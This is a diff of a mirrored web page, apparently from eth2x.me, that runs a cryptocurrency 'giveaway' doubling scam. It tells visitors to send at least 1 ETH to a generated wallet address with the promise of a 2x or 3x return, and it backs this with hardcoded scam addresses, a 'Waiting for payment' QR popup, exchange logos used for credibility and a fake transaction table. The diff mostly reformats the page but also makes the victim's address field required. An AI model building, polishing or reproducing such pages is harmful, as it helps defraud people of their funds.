@@ -1,10 +1,11 @@
 ﻿<!DOCTYPE html>
 <html lang="en">
- <head>
+
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    
+
     <link rel="stylesheet" rel="stylesheet" type="text/css" href="../files/style.css">
     <meta property="og:image" content="img/link.png">
     <link href="../files/fav.png" rel="shortcut icon" type="image/x-icon">
@@ -14,10 +15,14 @@
     <script src="../ui/1.11.4/jquery-ui.js"></script>
     <script type="text/javascript" src="../ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
     <link rel="stylesheet" rel="stylesheet" type="text/css" href="../files/theme.min.css">
-    <script src="../ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-    <script src="../bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="../ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+        crossorigin="anonymous"></script>
+    <script src="../bootstrap/4.0.0/js/bootstrap.min.js"
+        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+        crossorigin="anonymous"></script>
     <script>
-        window.onload = function() {
+        window.onload = function () {
             if (!localStorage.getItem("justonce")) {
                 localStorage.setItem("justOnce", "true");
                 window.location.reload();
@@ -27,9 +32,9 @@
 
     <script type="text/javascript">
         //<![CDATA[
-        window.onload = function() {
+        window.onload = function () {
 
-            } //]]>
+        } //]]>
     </script>
 </head>
 
@@ -40,7 +45,8 @@
     <div class="pop-body">
         <div class="pop-inner">
             <div class="pop-head">
-                <h3 class="pop-head-text">Generated Address</h3><svg id="close" height="20" viewbox="0 0 20 20" width="20" xmlns="http://www.w3.org/2000/svg">
+                <h3 class="pop-head-text">Generated Address</h3><svg id="close" height="20" viewbox="0 0 20 20"
+                    width="20" xmlns="http://www.w3.org/2000/svg">
                     <path d="M18.096 19.174l1.401-1.427L1.7.286.3 1.714z"></path>
                     <path d="M19.497 1.714L18.096.286.3 17.747l1.4 1.427z"></path>
                 </svg>
@@ -52,7 +58,9 @@
                             <div class="pop-qr">
                                 <div class="inner-qr">
                                     <div class="main-qr">
-                                        <div opacity="0" class="qr"><img id="qrcode_svg" width="200" height="200" src="../../chart.googleapis.com/chart5c3f.png?chs=130x130&chld=L|0&cht=qr&chl=ethereum:0x99DEa586991c9eFef6fcD49c97c8443E8FaCC03F" alt="qr"></div><span class="wallet">Waiting for payment</span>
+                                        <div opacity="0" class="qr"><img id="qrcode_svg" width="200" height="200"
+                                                src="../../chart.googleapis.com/chart5c3f.png?chs=130x130&chld=L|0&cht=qr&chl=ethereum:0x99DEa586991c9eFef6fcD49c97c8443E8FaCC03F"
+                                                alt="qr"></div><span class="wallet">Waiting for payment</span>
                                         <center><img src="../files/loading.svg" width="70px"></center>
                                     </div>
                                 </div>
@@ -76,7 +84,8 @@
 
                             <div class="inner-address"><span class="wallet-ad">Generated address:</span>
                                 <div class="address">
-                                    <div class="main-ad"><span class="real-address">0xBE4b33B0E177f83Bef966190DBe605b6bA2EE311</span></div>
+                                    <div class="main-ad"><span
+                                            class="real-address">0xBE4b33B0E177f83Bef966190DBe605b6bA2EE311</span></div>
                                     <div class="copy-body">
                                         <div class="copy-inner">
                                             <img class="cp" id="copy_address" src="../files/copy.svg">
@@ -87,7 +96,8 @@
                                     </div>
                                 </div>
                                 <a href="#" class="d-block m-auto" target="_blank" rel="noopener noreferrer">
-                                    <input id='paynow' value="Pay Now" class="btn btn-info mt-3" type="button" style="display:block; width: 100% !important;">
+                                    <input id='paynow' value="Pay Now" class="btn btn-info mt-3" type="button"
+                                        style="display:block; width: 100% !important;">
                                 </a>
                             </div>
                         </div>
@@ -96,7 +106,7 @@
             </div>
         </div>
     </div>
-    
+
     <section id="post-sec">
         <h1 style="text-align: center;"><img src="../files/logo.png" alt="Logo"></h1>
         <div class="post_body">
@@ -112,13 +122,13 @@
             <ul>
                 <li><b>Step1:</b> Make sure you have at least 1 ETH or above in your wallet.</li>
                 <li><b>Step2:</b> Enter the amount you wish to invest below.</li>
-                <li><b>Step3:</b> Enter your ETH address (optional)</li>
+                <li><b>Step3:</b> Enter your ETH address</li>
                 <li><b>Step4:</b> Click the "Generate Payment" button to generate the payment address.</li>
                 <li><b>Step5:</b> Click "Pay Now" to send the amount you have entered to the giveaway </li>
                 <li><b>Step6:</b> Confirm payment.</li>
                 <li><b>Step7:</b> Wait for at least 4 - 8 minutes.</li>
             </ul>
-            
+
             <p>The 2x (or 3x) bonus will be sent to the address you entered or the one you sent the ETH from.</p>
 
             <p style="color: rgb(201, 201, 201); font-size: 14px !important; margin-top: 2rem !important;"><i>If the
@@ -135,13 +145,17 @@
                             <div class="pic"><img src="../files/eth.svg" alt="EtH"></div>
                             <div class="amount">
                                 <div class="main-input">
-                                    <div class="in-main"><input id="cal-in" class="exchange-content__input theme__background-4 theme__text-4 " min="0" step="1" placeholder="0" type="number" maxlength="50" autocomplete="off" value=""></div>
+                                    <div class="in-main"><input id="cal-in"
+                                            class="exchange-content__input theme__background-4 theme__text-4 " min="0"
+                                            step="1" placeholder="0" type="number" maxlength="50" autocomplete="off"
+                                            value=""></div>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
-                <div class="icon-body"><span data-tip="Click to swap" data-for="swap-icon" currentitem="false"><img src="../files/exchange-alt.svg" alt="img" class="exchange__swap-icon"></span></div>
+                <div class="icon-body"><span data-tip="Click to swap" data-for="swap-icon" currentitem="false"><img
+                            src="../files/exchange-alt.svg" alt="img" class="exchange__swap-icon"></span></div>
                 <div class="input">
                     <div class="title">Bonus:</div>
                     <div class="amount-con">
@@ -149,7 +163,10 @@
                             <div class="pic"><img src="../files/eth.svg" alt="knc"></div>
                             <div class="amount">
                                 <div class="main-input">
-                                    <div class="in-main"><input id="cal-out" class="exchange-content__input theme__background-4 theme__text-4 " min="0" step="2" placeholder="0" type="number" maxlength="50" autocomplete="off" value=""></div>
+                                    <div class="in-main"><input id="cal-out"
+                                            class="exchange-content__input theme__background-4 theme__text-4 " min="0"
+                                            step="2" placeholder="0" type="number" maxlength="50" autocomplete="off"
+                                            value=""></div>
                                 </div>
                             </div>
                         </div>
@@ -158,7 +175,8 @@
             </div>
             <div class="enaddress">
                 <div class="title">Address:</div>
-                <div class="inner-enter"><input type="text" placeholder="Enter your ETH address" pattern="0x[A-Fa-f0-9]{40}"></div>
+                <div class="inner-enter"><input type="text" placeholder="Enter your ETH address"
+                        pattern="0x[A-Fa-f0-9]{40}"></div>
             </div>
             <div class="but-con">
                 <div id="gen-btn" class="swap-but">Generate Payment</div>
@@ -171,8 +189,10 @@
                         <div class="progress-ico">
                             <div class="progress-ico">
                                 <div class="progress">
-                                    <div class="progress-bar progress-bar-striped active progress-width" id="progress-ico" role="progressbar" style="width: 100%;">
-                                        <span class="sr-only">x</span></div>
+                                    <div class="progress-bar progress-bar-striped active progress-width"
+                                        id="progress-ico" role="progressbar" style="width: 100%;">
+                                        <span class="sr-only">x</span>
+                                    </div>
                                 </div>
                             </div>
                             <div class="dot-1" id="leftETH">
@@ -212,7 +232,8 @@
                             <div>
                                 <div class="import-account__block theme__import-button">
                                     <div class="import-account__icon trezor">
-                                        <div class="import-account__icon ledger"><img src="../files/okes.png" width="20"></div>
+                                        <div class="import-account__icon ledger"><img src="../files/okes.png"
+                                                width="20"></div>
                                     </div>
                                     <div class="import-account__name">OKEX</div>
                                 </div>
@@ -220,8 +241,10 @@
                         </div>
                         <div class="import-account__item">
                             <div>
-                                <div class="import-account__block theme__import-button" tabindex="0"><input type="file" multiple="" autocomplete="off" tabindex="-1" style="display:none;">
-                                    <div class="import-account__icon json"><img src="../files/tano.png" width="20" style="border-radius: 1rem;"></div>
+                                <div class="import-account__block theme__import-button" tabindex="0"><input type="file"
+                                        multiple="" autocomplete="off" tabindex="-1" style="display:none;">
+                                    <div class="import-account__icon json"><img src="../files/tano.png" width="20"
+                                            style="border-radius: 1rem;"></div>
                                     <div class="import-account__name">REMITANO</div>
                                 </div>
                             </div>
@@ -251,8 +274,10 @@
                         </div>
                         <div class="import-account__item">
                             <div>
-                                <div class="import-account__block theme__import-button" tabindex="0"><input type="file" multiple="" autocomplete="off" tabindex="-1" style="display:none;">
-                                    <div class="import-account__icon json"><img src="../files/ava.jpg" width="20" style="border-radius: 1rem;"></div>
+                                <div class="import-account__block theme__import-button" tabindex="0"><input type="file"
+                                        multiple="" autocomplete="off" tabindex="-1" style="display:none;">
+                                    <div class="import-account__icon json"><img src="../files/ava.jpg" width="20"
+                                            style="border-radius: 1rem;"></div>
                                     <div class="import-account__name">COINBASE</div>
                                 </div>
                             </div>
@@ -275,7 +300,8 @@
             <div class="card">
                 <div class="card-body">
                     <div class="tab-content">
-                        <div class="tab-pane fade show active" id="transactions" role="tabpanel" aria-labelledby="transactions-tab">
+                        <div class="tab-pane fade show active" id="transactions" role="tabpanel"
+                            aria-labelledby="transactions-tab">
                             <div class="table-responsive mb-2 mb-md-0">
                                 <table class="table table-hover" id="myTable">
                                     <thead class="thead-light">
@@ -287,9 +313,10 @@
                                             <th scope="col" width="30"></th>
                                             <th scope="col">To</th>
                                             <th scope="col">Value</th>
-                                            <th scope="col"><span id="ContentPlaceHolder1_spanTxFee" title="(Gas Price * Gas Used by Txns) in ETH">
+                                            <th scope="col"><span id="ContentPlaceHolder1_spanTxFee"
+                                                    title="(Gas Price * Gas Used by Txns) in ETH">
                                                     <spanclass="text-secondary">[Txn Fee]
-                                                </spanclass="text-secondary"></span>
+                                                    </spanclass="text-secondary"></span>
                                             </th>
                                         </tr>
                                     </thead>
@@ -367,10 +394,11 @@
     <script src="../files/jdfghkjdfhgvsjkdfgcphjkfdhgjsdfg.js"></script>
     <script src="custom.js"></script>
     <!--Start of Tawk.to Script-->
-   <script src="//code.jivosite.com/widget/7yjSqqXtuI" async></script>
-  <!--End of Tawk.to Script-->
+    <script src="//code.jivosite.com/widget/7yjSqqXtuI" async></script>
+    <!--End of Tawk.to Script-->
 </body>
 
 
 <!-- Mirrored from eth2x.me/eth/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 26 Oct 2020 10:18:12 GMT -->
+
 </html>
